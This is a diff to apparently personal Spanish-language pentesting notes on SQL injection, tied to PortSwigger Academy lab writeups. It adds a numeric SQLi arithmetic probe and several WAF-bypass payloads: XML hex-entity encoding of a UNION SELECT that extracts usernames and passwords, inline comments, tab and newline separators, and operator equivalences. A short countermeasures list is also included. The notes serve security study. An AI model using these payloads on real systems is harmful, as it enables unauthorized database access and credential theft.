@@ -31,6 +31,11 @@ sqlmap -u "http://target.com/products.php?id=1" -D public_db -T users --columns 
 
 ### Pruebas manuales básicas
 ```sql
+-- Sondeo aritmetico para numeric SQLi (sin keywords, pasa WAF de patrones).
+-- Si el campo original es 2 y mandar 3-1 devuelve el mismo resultado: numeric SQLi.
+-- Si la respuesta cambia o falla: campo parametrizado, o string SQLi (necesita ').
+3-1     -- equivalente a 2 si la DB evalua la expresion
+
 -- Bypass de login simple
 admin' OR '1'='1' --
 admin' #
@@ -116,6 +121,42 @@ interactsh-client    # imprime el subdominio único asignado, ej. xxxxx.oast.me
 
 > **Nota operacional — allowlists OAST**: PortSwigger Academy bloquea outbound hacia cualquier dominio distinto de `*.oastify.com` (Burp Collaborator). Sin Burp Pro los labs OOB de la Academy no son resolubles via interactsh/DNSLog. En pentests reales o bug bounty no suele haber esa restricción y interactsh es suficiente. Verificar restricciones del target antes de invertir tiempo en debug — si el firewall corta la salida, ningún payload funcionará. Ver writeup `learning/portswigger/blind-sqli-out-of-band/` para diagnóstico completo del caso.
 
+```xml
+<!-- WAF bypass via XML hex entities: cuando el body es XML y el WAF
+     inspecciona el wire format, encodear las primeras letras de las
+     keywords basta para romper el match. El parser XML las decodea
+     antes de pasarlas al backend. -->
+
+<!-- Original (bloqueado por WAF que detecta UNION/SELECT/'): -->
+<storeId>1 UNION SELECT username||':'||password FROM users</storeId>
+
+<!-- Bypass minimo (encodear solo primera letra de keywords y comillas): -->
+<storeId>1 &#x55;NION &#x53;ELECT username||&#x27;~&#x27;||password FROM users</storeId>
+
+<!-- Bypass agresivo (encodear keyword entera, mas ruidoso pero pasa WAFs mas finos): -->
+<storeId>1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; ...</storeId>
+```
+
+```sql
+-- Otros bypasses comunes (sin encoding de formato, a nivel SQL):
+
+-- Comentarios inline para romper el match exacto (MySQL/MariaDB)
+UN/**/ION SE/**/LECT 1,2--
+
+-- Whitespace alternativo cuando el WAF normaliza espacios pero no tabs/newlines
+UNION%09SELECT 1,2--      -- tab
+UNION%0aSELECT 1,2--      -- newline
+UNION/**/SELECT 1,2--     -- comentario como separador
+
+-- Equivalencias semanticas
+&& en lugar de AND  -- MySQL
+|| en lugar de OR   -- PostgreSQL/Oracle/SQLite (ojo: tambien es concat)
+MID() en lugar de SUBSTRING()
+IIF() en lugar de CASE WHEN  -- MS SQL
+```
+
+> **Heurística WAF bypass**: orden de prueba — (1) encoding por formato del body (XML entities, JSON unicode escapes); (2) comentarios inline + whitespace alternativo; (3) equivalencias semánticas. Combinar varias suele bypassear hasta WAFs decentes. Ver writeup `learning/portswigger/sqli-filter-bypass-xml-encoding/` para ejemplo end-to-end con XML hex entities.
+
 ## Contramedidas
 - Uso de consultas preparadas (Prepared Statements) con parametrización.
 - Implementación de una lista blanca (Allow-list) para la validación de entradas.
@@ -129,3 +170,4 @@ interactsh-client    # imprime el subdominio único asignado, ej. xxxxx.oast.me
 - Writeup propio: [`learning/portswigger/blind-sqli-time-delays/writeup.md`](../../../learning/portswigger/blind-sqli-time-delays/writeup.md) — ejemplo end-to-end de time-based con `pg_sleep` (stacked queries en cookie, `;` URL-encoded como `%3B`).
 - Writeup propio: [`learning/portswigger/blind-sqli-time-delays-info-retrieval/writeup.md`](../../../learning/portswigger/blind-sqli-time-delays-info-retrieval/writeup.md) — extracción carácter a carácter con script Python paralelizado.
 - Writeup propio: [`learning/portswigger/blind-sqli-out-of-band/writeup.md`](../../../learning/portswigger/blind-sqli-out-of-band/writeup.md) — OOB Oracle XXE via `xmltype` + diagnóstico de allowlist OAST en PortSwigger Academy.
+- Writeup propio: [`learning/portswigger/sqli-filter-bypass-xml-encoding/writeup.md`](../../../learning/portswigger/sqli-filter-bypass-xml-encoding/writeup.md) — WAF bypass via XML hex entities (`&#x55;NION`) sobre endpoint XML, con sondeo numeric SQLi via aritmética.
